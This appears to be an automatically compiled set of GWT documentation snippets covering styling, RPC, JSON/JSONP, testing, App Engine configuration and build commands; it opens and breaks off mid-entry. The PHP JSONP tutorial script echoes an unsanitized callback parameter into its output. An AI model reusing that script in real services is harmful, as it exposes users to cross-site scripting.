<NameStartingWithCaps>:arguments\n```\n\n----------------------------------------\n\nTITLE: Including CSS Stylesheet in GWT Host HTML Page\nDESCRIPTION: Shows how to include a CSS stylesheet in the GWT host HTML page using a link tag.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideUiCss.md#2025-04-09_snippet_5\n\nLANGUAGE: html\nCODE:\n```\n<link rel=\"stylesheet\" href=\"mystyles.css\" type=\"text/css\"/>\n```\n\n----------------------------------------\n\nTITLE: Configuring Session Cookie Name for XSRF Protection\nDESCRIPTION: XML configuration for specifying the session cookie name used for XSRF token generation\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideSecurityRpcXsrf.md#2025-04-09_snippet_1\n\nLANGUAGE: xml\nCODE:\n```\n<context-param>\n  <param-name>gwt.xsrf.session_cookie_name</param-name>\n  <param-value>JSESSIONID</param-value>\n</context-param>\n```\n\n----------------------------------------\n\nTITLE: Running Ant to Compile GWT Application\nDESCRIPTION: Example of an Ant compilation process for a GWT application, showing the steps of compiling multiple permutations and linking them into a WAR directory.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideCompilingAndDebugging.md#2025-04-09_snippet_5\n\nLANGUAGE: text\nCODE:\n```\nC:\\gwt-2.6.1\\samples\\Hello>ant\nBuildfile: build.xml\n\nlibs:\n\njavac:\n\ngwtc:\n     [java] Compiling module com.google.gwt.sample.hello.Hello\n     [java]    Compiling 5 permutations\n     [java]       Permutation compile succeeded\n     [java]    Linking into war\n     [java]       Link succeeded\n     [java]    Compilation succeeded -- 20.313s\n\nbuild:\n\nBUILD SUCCESSFUL\nTotal time: 22 seconds\n```\n\n----------------------------------------\n\nTITLE: Examining WAR Directory Structure After GWT Compilation\nDESCRIPTION: This snippet shows the structure of a war directory after running the GWT compiler, including the various cache files, images, and JavaScript bootstrap file generated for the Hello application.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideCompilingAndDebugging.md#2025-04-09_snippet_6\n\nLANGUAGE: text\nCODE:\n```\nC:\\gwt-2.6.1\\samples\\Hello>\\bin\\find war\nwar\nwar\\hello\nwar\\hello\\18EEC2DA45CB5F0C2050E2539AE61FCE.cache.html\nwar\\hello\\813B962DC4C22396EA14405DDEF020EE.cache.html\nwar\\hello\\86DA1DCEF4F40731BE71E7978CD4776A.cache.html\nwar\\hello\\A37FC20FF4D8F11605B2C4C53AF20B6F.cache.html\nwar\\hello\\E3C1ABB32E39A126A9194DB727F7742A.cache.html\nwar\\hello\\14A43CD7E24B0A0136C2B8B20D6DF3C0.cache.png\nwar\\hello\\548CDF11D6FE9011F3447CA200D7FB7F.cache.png\nwar\\hello\\9DA92932034707C17CFF15F95086D53F.cache.png\nwar\\hello\\A7CD51F9E5A7DED5F85AD1D82BA67A8A.cache.png\nwar\\hello\\B8517E9C2E38AA39AB7C0051564224D3.cache.png\nwar\\hello\\clear.cache.gif\nwar\\hello\\hello.nocache.js\nwar\\hello\\hosted.html\nwar\\Hello.html\n```\n\n----------------------------------------\n\nTITLE: Styling Specific GWT Widget by ID with CSS\nDESCRIPTION: Shows how to apply a CSS rule to a specific GWT widget using its ID.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideUiCss.md#2025-04-09_snippet_3\n\nLANGUAGE: css\nCODE:\n```\n#my-button-id { font-size: 100%; }\n```\n\n----------------------------------------\n\nTITLE: Implementing Exception Throwing in GWT RPC Service Implementation\nDESCRIPTION: This snippet shows how to implement the service method that throws a checked exception. The StockPriceServiceImpl class checks for a specific stock symbol (\"ERR\") and throws a DelistedException when it is encountered.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/tutorial/RPC.md#2025-04-09_snippet_14\n\nLANGUAGE: java\nCODE:\n```\nimport com.google.gwt.sample.stockwatcher.client.DelistedException;\n    \n...\n\npublic StockPrice[] getPrices(String[] symbols) throws DelistedException {\n  Random rnd = new Random();\n\n  StockPrice[] prices = new StockPrice[symbols.length];\n\n  for (int i=0; i<symbols.length; i++) {\n    if (symbols[i].equals(\"ERR\")) {\n      throw new DelistedException(\"ERR\");\n    }\n\n    double price = rnd.nextDouble() * MAX_PRICE;\n    double change = price * MAX_PRICE_CHANGE * (rnd.nextDouble() * 2f - 1f);\n\n    prices[i] = new StockPrice(symbols[i], price, change);\n  }\n\n  return prices;\n}\n```\n\n----------------------------------------\n\nTITLE: Initializing and Using ArrayList in Java\nDESCRIPTION: ArrayList is a resizable array implementation of the List interface. It provides methods for adding, removing, and accessing elements, as well as utilities for capacity management and iteration.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/RefJreEmulation.md#2025-04-09_snippet_9\n\nLANGUAGE: Java\nCODE:\n```\nArrayList<E> list = new ArrayList<>();\nlist.add(element);\nlist.get(index);\nlist.remove(index);\nlist.size();\nlist.clear();\nlist.isEmpty();\nlist.contains(object);\nlist.iterator();\nlist.toArray();\n```\n\n----------------------------------------\n\nTITLE: Unobfuscated Compiled JavaScript Output for onModuleLoad()\nDESCRIPTION: This snippet shows the unobfuscated JavaScript output generated by GWT for the onModuleLoad() method. It demonstrates how GWT optimizes the Java code into efficient JavaScript.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideCodingBasicsOverlay.md#2025-04-09_snippet_6\n\nLANGUAGE: javascript\nCODE:\n```\nfunction $onModuleLoad(){\n  var cs, i, n;\n  cs = $wnd.jsonData;\n  for (i = 0, n = cs.length; i < n; ++i) {\n    $wnd.alert('Hello, ' + (cs[i].FirstName + ' ' + cs[i].LastName));\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Running CSS to GSS Conversion Tool\nDESCRIPTION: Command line example for running the CSS to GSS conversion tool.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/articles/gss_migration.md#2025-04-09_snippet_7\n\nLANGUAGE: shell\nCODE:\n```\njava -cp gwt-user.jar com.google.gwt.resources.converter.Css2Gss fileToConvert.css\n```\n\n----------------------------------------\n\nTITLE: Original RequestBuilder Implementation in StockWatcher\nDESCRIPTION: The original implementation using RequestBuilder that was removed when switching to JsonpRequestBuilder for cross-domain requests.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/tutorial/Xsite.md#2025-04-09_snippet_7\n\nLANGUAGE: java\nCODE:\n```\n// Send request to server and catch any errors.\nRequestBuilder builder = new RequestBuilder(RequestBuilder.GET, url);\n\ntry {\n  Request request = builder.sendRequest(null, new RequestCallback() {\n    public void onError(Request request, Throwable exception) {\n      displayError(\"Couldn't retrieve JSON\");\n    }\n\n    public void onResponseReceived(Request request, Response response) {\n      if (200 == response.getStatusCode()) {\n        updateTable(JsonUtils.safeEval(response.getText()));\n      } else {\n        displayError(\"Couldn't retrieve JSON (\" + response.getStatusText()\n            + \")\");\n      }\n    }\n  });\n} catch (RequestException e) {\n  displayError(\"Couldn't retrieve JSON\");\n}\n```\n\n----------------------------------------\n\nTITLE: Importing RootPanel in GWT StockWatcher Application\nDESCRIPTION: This snippet shows the import statement needed for accessing the RootPanel class, which is essential for connecting GWT widgets to the HTML host page.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/tutorial/buildui.md#2025-04-09_snippet_8\n\nLANGUAGE: java\nCODE:\n```\nimport com.google.gwt.user.client.ui.RootPanel;\n```\n\n----------------------------------------\n\nTITLE: Initializing Error Label Widget in Java\nDESCRIPTION: Declaration of instance fields including the error message Label widget for the StockWatcher application.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/tutorial/JSON.md#2025-04-09_snippet_14\n\nLANGUAGE: java\nCODE:\n```\nprivate ArrayList<String> stocks = new ArrayList<String>();\nprivate Label errorMsgLabel = new Label();\n```\n\n----------------------------------------\n\nTITLE: Setting GSS Default in UiBinder\nDESCRIPTION: Configuration property to set GSS as the default for all UiBinder style elements.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/articles/gss_migration.md#2025-04-09_snippet_6\n\nLANGUAGE: xml\nCODE:\n```\n<set-configuration-property name=\"CssResource.gssDefaultInUiBinder\" value=\"true\" />\n```\n\n----------------------------------------\n\nTITLE: Java Class Definitions for JSNI Constructor Examples\nDESCRIPTION: This code snippet shows Java class definitions that are used in the examples of invoking Java constructors from JavaScript. It includes a top-level class, a static inner class, and an instance inner class.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideCodingBasicsJSNI.md#2025-04-09_snippet_3\n\nLANGUAGE: java\nCODE:\n```\npackage pkg;\nclass TopLevel {\n  public TopLevel() { ... }\n  public TopLevel(int i) { ... }\n\n  static class StaticInner {\n    public StaticInner() { ... }\n  }\n\n  class InstanceInner {\n    public InstanceInner(int i) { ... }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Using Timer in GWT\nDESCRIPTION: Illustrates the import statement for Timer class in GWT, which provides a simplified, browser-safe alternative to java.util.Timer for the single-threaded environment of web browsers.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideCodingBasicsCompatibility.md#2025-04-09_snippet_4\n\nLANGUAGE: Java\nCODE:\n```\nimport com.google.gwt.user.client.Timer;\n```\n\n----------------------------------------\n\nTITLE: Setting Size Constraint on a String Field\nDESCRIPTION: A simple example of applying a size constraint to a field, requiring the name property to have a minimum length of 4 characters.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideValidation.md#2025-04-09_snippet_1\n\nLANGUAGE: java\nCODE:\n```\npublic class Person {\n  @Size(min = 4)\n  private String name;\n```\n\n----------------------------------------\n\nTITLE: Enabling GSS Configuration in GWT\nDESCRIPTION: Configuration property to enable GSS for all CssResource interfaces in GWT compiler.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/articles/gss_migration.md#2025-04-09_snippet_0\n\nLANGUAGE: xml\nCODE:\n```\n<set-configuration-property name=\"CssResource.enableGss\" value=\"true\" />\n```\n\n----------------------------------------\n\nTITLE: PHP Stock Price Generator Script\nDESCRIPTION: Server-side PHP script that generates random stock prices and returns them in JSONP format. Supports multiple stock symbols and includes proper headers for JavaScript content type and cache control.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/tutorial/Xsite.md#2025-04-09_snippet_1\n\nLANGUAGE: php\nCODE:\n```\n<?php\n\n  header('Content-Type: text/javascript');\n  header('Cache-Control: no-cache');\n  header('Pragma: no-cache');\n\n  define(\"MAX_PRICE\", 100.0); // $100.00\n  define(\"MAX_PRICE_CHANGE\", 0.02); // +/- 2%\n\n  $callback = trim($_GET['callback']);\n  echo $callback;\n  echo '([';\n\n  $q = trim($_GET['q']);\n  if ($q) {\n    $symbols = explode(' ', $q);\n\n    for ($i=0; $i<count($symbols); $i++) {\n      $price = lcg_value() * MAX_PRICE;\n      $change = $price * MAX_PRICE_CHANGE * (lcg_value() * 2.0 - 1.0);\n\n      echo '{';\n      echo \"\\\"symbol\\\":\\\"$symbols[$i]\\\",\";\n      echo \"\\\"price\\\":$price,\";\n      echo \"\\\"change\\\":$change\";\n      echo '}';\n\n      if ($i < (count($symbols) - 1)) {\n        echo ',';\n      }\n    }\n  }\n\n  echo ']);';\n?>\n```\n\n----------------------------------------\n\nTITLE: HTML Example Showing Percentage Height/Width Limitations in Standards Mode\nDESCRIPTION: HTML example demonstrating why percentage-based dimensions don't work in certain contexts in standards mode. The div with percentage height and width inside a table cell has its styles ignored.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/FAQ_UI.md#2025-04-09_snippet_5\n\nLANGUAGE: html\nCODE:\n```\n<td>\n      <div style=\"height:100%;width:100%;>test</div>\n    </td>\n```\n\n----------------------------------------\n\nTITLE: Creating a Button in GWT\nDESCRIPTION: Java code snippet showing how to create a button in a GWT application. The original code creates a button with \"Send\" text.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/gettingstarted.md#2025-04-09_snippet_4\n\nLANGUAGE: java\nCODE:\n```\nfinal Button sendButton = new Button(\"Send\");\n```\n\n----------------------------------------\n\nTITLE: Firing Events After RPC Response\nDESCRIPTION: Shows how to fire a ContactUpdatedEvent after successfully updating a contact via RPC. The event is fired in the onSuccess callback with the updated contact data.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/articles/mvp-architecture.md#2025-04-09_snippet_7\n\nLANGUAGE: java\nCODE:\n```\npublic class EditContactPresenter {\n  ...\n  private void doSave() {\n    contact.setFirstName(display.getFirstName().getValue());\n    contact.setLastName(display.getLastName().getValue());\n    contact.setEmailAddress(display.getEmailAddress().getValue());\n\n    rpcService.updateContact(contact, new AsyncCallback<Contact>() {\n        public void onSuccess(Contact result) {\n          eventBus.fireEvent(new ContactUpdatedEvent(result));\n        }\n        public void onFailure(Throwable caught) {\n           ... \n        }\n    });\n  }\n  ...\n}\n```\n\n----------------------------------------\n\nTITLE: Firing Events After RPC Response\nDESCRIPTION: Shows how to fire a ContactUpdatedEvent after successfully updating a contact via RPC. The event is fired in the onSuccess callback with the updated contact data.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/articles/mvp-architecture.md#2025-04-09_snippet_7\n\nLANGUAGE: java\nCODE:\n```\npublic class EditContactPresenter {\n  ...\n  private void doSave() {\n    contact.setFirstName(display.getFirstName().getValue());\n    contact.setLastName(display.getLastName().getValue());\n    contact.setEmailAddress(display.getEmailAddress().getValue());\n\n    rpcService.updateContact(contact, new AsyncCallback<Contact>() {\n        public void onSuccess(Contact result) {\n          eventBus.fireEvent(new ContactUpdatedEvent(result));\n        }\n        public void onFailure(Throwable caught) {\n           ... \n        }\n    });\n  }\n  ...\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing Interceptors for AutoBean in GWT\nDESCRIPTION: Demonstrates how to implement an interceptor method in a category to examine and possibly replace return values of non-void methods in the target interface.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideAutoBeans.md#2025-04-09_snippet_9\n\nLANGUAGE: java\nCODE:\n```\npublic static <T> T __intercept(AutoBean<?> bean, T returnValue) {\n  // Do stuff\n  return maybeAlteredReturnValue;\n}\n```\n\n----------------------------------------\n\nTITLE: Triggering Exception for Debugging in GWT\nDESCRIPTION: This code snippet shows how to intentionally trigger a NullPointerException in a GWT application for debugging purposes. It demonstrates logging before the exception and accessing a null object.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideCompilingAndDebugging.md#2025-04-09_snippet_1\n\nLANGUAGE: Java\nCODE:\n```\npublic void onClick(Widget sender) {\n        GWT.log(\"User pressed a button.\", null);\n        Object nullObject = null;\n        nullObject.toString(); // Should cause NullPointerException\n```\n\n----------------------------------------\n\nTITLE: Running a GWT Application in Development Mode\nDESCRIPTION: Commands to navigate to the application directory and start the GWT development mode server using Ant.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/gettingstarted.md#2025-04-09_snippet_3\n\nLANGUAGE: shell\nCODE:\n```\ncd MyWebApp/\n\nant devmode\n```\n\n----------------------------------------\n\nTITLE: Example URL with History Token\nDESCRIPTION: Sample URL showing how a history token appears in the browser address bar. The token 'page1' is appended after the hash (#) symbol in the URL.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideCodingBasicsHistory.md#2025-04-09_snippet_1\n\nLANGUAGE: text\nCODE:\n```\nhttp://www.example.com/com.example.gwt.HistoryExample/HistoryExample.html#page1\n```\n\n----------------------------------------\n\nTITLE: Utilizing Collections Utility Class in Java\nDESCRIPTION: The Collections class provides static methods to operate on or return collections. It includes methods for sorting, searching, and synchronizing collection objects, as well as creating unmodifiable and singleton collections.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/RefJreEmulation.md#2025-04-09_snippet_12\n\nLANGUAGE: Java\nCODE:\n```\nCollections.sort(list);\nCollections.binarySearch(list, key);\nCollections.reverse(list);\nCollections.shuffle(list);\nCollections.min(collection);\nCollections.max(collection);\nCollections.frequency(collection, object);\nCollections.unmodifiableList(list);\nCollections.synchronizedMap(map);\nCollections.emptyList();\n```\n\n----------------------------------------\n\nTITLE: Styling GWT Examples and Projects Display\nDESCRIPTION: CSS rules for styling GWT examples page layout, including demo sections, project cards with screenshots, and information displays. Handles spacing, images, fonts and layout for showcasing GWT sample applications.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/examples.md#2025-04-09_snippet_0\n\nLANGUAGE: css\nCODE:\n```\ndiv.demo {\n      padding: 3px;\n      padding-left: 20px;\n      background-image: url(\"images/newwindow.gif\");\n      background-repeat: no-repeat;\n      background-position: left center;\n    }\n\n    ul.demo {\n      margin-top: 20px;\n      margin-bottom: 10px;\n    }\n\n    ul.demo li {\n      list-style-image: url(\"images/newwindow.gif\");\n      list-style-type: disc;\n    }\n\n    .project {\n      clear: both;\n      margin-bottom: 1.25em;\n      padding: 10px 0 10px 0;\n    }\n\n    .project .screenshot {\n      float: left;\n    }\n\n    .project .name {\n      font-size: medium;\n      background-image: url(\"/webtoolkit/images/newwindow.gif\");\n      background-repeat: no-repeat;\n      background-position: left center;\n    }\n\n    .project .screenshot img {\n      width: 125px;\n      height: 109px;\n      border: 1px solid;\n      margin-right: 10px;\n    }\n\n    .project .info .apis {\n      margin-top: 0.5em;\n    }\n\n    .project .head {\n      font-size: .8em;\n    }\n\n    .project .info .apis .item {\n      margin-left: 10px;\n      font-size: .8em;\n    }\n\n    .example {\n      margin-top: 1em;\n    }\n\n    .project .snippet {\n      font-size: .8em;\n    }\n\n    .project .snippet a {\n      font-size: .8em;\n    }\n```\n\n----------------------------------------\n\nTITLE: Extracting the GWT SDK on Unix-based Systems\nDESCRIPTION: Command to unzip the GWT SDK package on Mac or Linux systems.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/gettingstarted.md#2025-04-09_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\nunzip gwt-2.10.0.zip\n```\n\n----------------------------------------\n\nTITLE: Session Storage Usage for GWT Dev Mode Hook\nDESCRIPTION: JavaScript showing how the Super Dev Mode bookmarklet sets a session storage variable to redirect the GWT module to the code server. This mechanism allows the code server to serve compiled JavaScript.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/articles/superdevmode.md#2025-04-09_snippet_3\n\nLANGUAGE: javascript\nCODE:\n```\nwindow.sessionStorage[\"__gwtDevModeHook:hello\"]\n// returns  \"http://localhost:9876/hello/hello.nocache.js\"\n```\n\n----------------------------------------\n\nTITLE: Firefox Memory Leak Fix Reference in Release Notes\nDESCRIPTION: A Markdown link to a GitHub issue tracker in the release notes mentioning bug fixes for GWT 2.7, including compile errors, GWT-RPC, and browser-specific issues.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/release-notes.md#2025-04-09_snippet_3\n\nLANGUAGE: markdown\nCODE:\n```\n(https://github.com/gwtproject/gwt/issues?q=is%3Aissue+label%3AMilestone-2_7)\n```\n\n----------------------------------------\n\nTITLE: Testing GWT MVP with GWTTestCase\nDESCRIPTION: Example showing the same test implemented using GWTTestCase, which requires a browser environment. This approach is slower due to the need to launch a headless browser for testing, taking about 15 seconds compared to 0.01 seconds for the JRE test.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/articles/mvp-architecture.md#2025-04-09_snippet_15\n\nLANGUAGE: java\nCODE:\n```\npublic class ExampleGWTTest extends GWTTestCase {\n  private ContactsPresenter contactsPresenter;\n  private ContactsServiceAsync rpcService;\n  private EventBus eventBus;\n  private ContactsPresenter.Display display;\n\n  public String getModuleName() {\n    return \"com.google.gwt.sample.contacts.Contacts\";\n  }\n\n  public void gwtSetUp() {\n    rpcService = GWT.create(ContactsService.class);\n    eventBus = new SimpleEventBus();\n    display = new ContactsView();\n    contactsPresenter = new ContactsPresenter(rpcService, eventBus, display);\n  }\n\n  public void testContactSort(){\n    List<ContactDetails> contactDetails = new ArrayList<ContactDetails>();\n    contactDetails.add(new ContactDetails(\"0\", \"c_contact\"));\n    contactDetails.add(new ContactDetails(\"1\", \"b_contact\"));\n    contactDetails.add(new ContactDetails(\"2\", \"a_contact\"));\n    contactsPresenter.setContactDetails(contactDetails);\n    contactsPresenter.sortContactDetails();\n    assertTrue(contactsPresenter.getContactDetail(0).getDisplayName().equals(\"a_contact\"));\n    assertTrue(contactsPresenter.getContactDetail(1).getDisplayName().equals(\"b_contact\"));\n    assertTrue(contactsPresenter.getContactDetail(2).getDisplayName().equals(\"c_contact\"));\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Building Production Package\nDESCRIPTION: Command to compile and package the GWT application for production deployment.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/gettingstarted-v2.md#2025-04-09_snippet_5\n\nLANGUAGE: shell\nCODE:\n```\nmvn clean package\n```\n\n----------------------------------------\n\nTITLE: Example JSON Response from PHP Stock Data Server\nDESCRIPTION: This JSON sample shows the expected output from the stockPrices.php script when queried with stock symbols 'ABC' and 'DEF'. It demonstrates the structure of the JSON response with symbol, price, and change values for each requested stock.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/tutorial/JSONphp.md#2025-04-09_snippet_1\n\nLANGUAGE: json\nCODE:\n```\n[{\"symbol\":\"ABC\",\"price\":40.485578668179,\"change\":-0.53944918844604},\n    {\"symbol\":\"DEF\",\"price\":1.3606576154209,\"change\":0.0051755221198266}]\n```\n\n----------------------------------------\n\nTITLE: String Class Methods and Constants\nDESCRIPTION: Core String class API including constructors, string manipulation methods and constants like CASE_INSENSITIVE_ORDER.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/RefJreEmulation.md#2025-04-09_snippet_5\n\nLANGUAGE: Java\nCODE:\n```\nString(), String(byte[]), String(byte[], int, int)\nString.valueOf(Object), String.format(String, Object...)\nlength(), isEmpty(), trim(), substring(int, int)\n```\n\n----------------------------------------\n\nTITLE: Structuring HTML for GWT Project Showcase\nDESCRIPTION: This HTML snippet demonstrates how to structure a showcase of GWT projects. It uses divs with 'project' class to contain each project's information, including a screenshot and description. The structure is consistent across multiple project entries.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/examples.md#2025-04-09_snippet_1\n\nLANGUAGE: HTML\nCODE:\n```\n<div class=\"project\">\n  <div class=\"screenshot\">\n    <a href=\"http://www.google.com/inbox\" target=\"_blank\"><img src=\"images/inbox.png\" alt=\"Google Inbox\"/></a>\n  </div>\n  <div class=\"info\">\n    <div class=\"name\"><a href=\"http://www.google.com/inbox\" target=\"_blank\">Google Inbox</a></div>\n    <div class=\"snippet\">Google Inbox is a fresh start that goes beyond email to help you get back to what matters.\n\tInbox is using a new approach to\n\t<a href=\"https://www.youtube.com/watch?feature=player_embedded&v=KdCs85jqcH0#t=747\">delivering multiplatform native applications</a>\n\tusing common code base. GWT is used to deliver the Web version.\n\t<p>Google is using GWT in number of other public services, including:\n\t\t<a href=\"https://docs.google.com/spreadsheets\" target=\"_blank\">Spreadsheets</a>,\n\t\t<a href=\"https://groups.google.com/forum/\" target=\"_blank\">Groups</a>,\n\t\t<a href=\"https://adwords.google.com \" target=\"_blank\">AdWords</a>,\n\t\t<a href=\"https://www.google.com/webmasters/tools/home\" target=\"_blank\">Webmaster Tools</a>,\n\t\t<a href=\"https://www.google.com/moderator/\" target=\"_blank\">Moderator</a>,\n\t\t<a href=\"https://www.blogger.com/\" target=\"_blank\">Blogger&nbsp;Admin</a>,\n\t\t<a href=\"https://www.google.com/wallet/\" target=\"_blank\">Wallet</a>,\n\t\t<a href=\"https://www.google.com/fonts/\" target=\"_blank\">WebFonts</a>,\n\t\t<a href=\"https://www.google.com/script/\" target=\"_blank\">Apps&nbsp;Script</a>,\n\t\t<a href=\"https://www.google.com/producer/\" target=\"_blank\">Currents&nbsp;Producer</a>,\n\t\t<a href=\"https://www.google.com/flights/\" target=\"_blank\">Flights</a>,\n\t\t<a href=\"https://www.google.com/fusiontables/DataSource?dsrcid=2049253\" target=\"_blank\">Fusion&nbsp;Tables</a>,\n\t\t<a href=\"https://www.google.com/hotels/\" target=\"_blank\">Hotel&nbsp;Finder</a>.\n\t</p>\n </div>\n  </div>\n</div>\n```\n\n----------------------------------------\n\nTITLE: GWT Button Creation - Original\nDESCRIPTION: Java code showing the original button creation with 'Send' label.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/gettingstarted-v2.md#2025-04-09_snippet_3\n\nLANGUAGE: java\nCODE:\n```\nfinal Button sendButton = new Button(\"Send\");\n```\n\n----------------------------------------\n\nTITLE: Setting JSON_URL Constant for Local Python Server\nDESCRIPTION: Java code snippet that updates the JSON_URL constant in StockWatcher to point to a different port (8000) where the Python simulation server is running.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/tutorial/Xsite.md#2025-04-09_snippet_3\n\nLANGUAGE: java\nCODE:\n```\nprivate static final String JSON_URL = \"http://localhost:8000/?q=\";\n```\n\n----------------------------------------\n\nTITLE: Initializing GWT Project with WebAppCreator\nDESCRIPTION: Command to create a new GWT project using the webAppCreator tool, including JUnit setup.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideTestingCoverage.md#2025-04-09_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\n./webAppCreator -out myapp  \n                     -junit ../../../../gwt-tools/lib/junit/junit-3.8.1.jar \n                     com.example.myapp.MyApp\n```\n\n----------------------------------------\n\nTITLE: Updating StockWatcher Class Fields\nDESCRIPTION: Addition of necessary fields to the StockWatcher class for handling authentication and stock services.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/tutorial/appengine.md#2025-04-09_snippet_21\n\nLANGUAGE: java\nCODE:\n```\npublic class StockWatcher implements EntryPoint {\n\n  private static final int REFRESH_INTERVAL = 5000; // ms\n  private VerticalPanel mainPanel = new VerticalPanel();\n  private FlexTable stocksFlexTable = new FlexTable();\n  private HorizontalPanel addPanel = new HorizontalPanel();\n  private TextBox newSymbolTextBox = new TextBox();\n  private Button addStockButton = new Button(\"Add\");\n  private Label lastUpdatedLabel = new Label();\n  private ArrayList<String> stocks = new ArrayList<String>();\n    private LoginInfo loginInfo = null;\n    private VerticalPanel loginPanel = new VerticalPanel();\n    private Label loginLabel = new Label(\"Please sign in to your Google Account to access the StockWatcher application.\");\n    private Anchor signInLink = new Anchor(\"Sign In\");\n    private final StockServiceAsync stockService = GWT.create(StockService.class);\n```\n\n----------------------------------------\n\nTITLE: Setting JSON_URL Constant for Remote Domain Server\nDESCRIPTION: Java code snippet that updates the JSON_URL constant in StockWatcher to point to a remote domain for retrieving stock data from a PHP script.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/tutorial/Xsite.md#2025-04-09_snippet_4\n\nLANGUAGE: java\nCODE:\n```\nprivate static final String JSON_URL = \"http://_www.myStockServerDomain.com_/stockPrices.php?q=\";\n```\n\n----------------------------------------\n\nTITLE: Invalid SafeHtml Message Format Example\nDESCRIPTION: Example showing an invalid SafeHtml message format where parameters appear inside HTML tag attributes, which is not allowed for security reasons in SafeHtml messages.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideI18nMessages.md#2025-04-09_snippet_9\n\nLANGUAGE: properties\nCODE:\n```\nerrorHtmlWithClass = A <span class=\"{0}\">{1} error</span> has occurred.\n```\n\n----------------------------------------\n\nTITLE: Configuring JDO for App Engine Datastore in XML\nDESCRIPTION: This XML snippet configures Java Data Objects (JDO) for use with App Engine's Datastore. It sets up a persistence manager factory with specific properties for App Engine.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/tutorial/appengine.md#2025-04-09_snippet_1\n\nLANGUAGE: XML\nCODE:\n```\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<jdoconfig xmlns=\"http://java.sun.com/xml/ns/jdo/jdoconfig\"\n    xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n    xsi:noNamespaceSchemaLocation=\"http://java.sun.com/xml/ns/jdo/jdoconfig\">\n  <persistence-manager-factory name=\"transactions-optional\">\n    <property name=\"javax.jdo.PersistenceManagerFactoryClass\" value=\"org.datanucleus.store.appengine.jdo.DatastoreJDOPersistenceManagerFactory\"/>\n    <property name=\"javax.jdo.option.ConnectionURL\" value=\"appengine\"/>\n    <property name=\"javax.jdo.option.NontransactionalRead\" value=\"true\"/>\n    <property name=\"javax.jdo.option.NontransactionalWrite\" value=\"true\"/>\n    <property name=\"javax.jdo.option.RetainValues\" value=\"true\"/>\n    <property name=\"datanucleus.appengine.autoCreateDatastoreTxns\" value=\"true\"/>\n  </persistence-manager-factory>\n</jdoconfig>\n```\n\n----------------------------------------\n\nTITLE: Original JSON_URL Declaration in StockWatcher\nDESCRIPTION: The original JSON_URL constant declaration in the StockWatcher class that points to a local service within the same domain.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/tutorial/Xsite.md#2025-04-09_snippet_5\n\nLANGUAGE: java\nCODE:\n```\nprivate static final String JSON_URL = GWT.getModuleBaseURL() + \"stockPrices?q=\";\n```\n\n----------------------------------------\n\nTITLE: 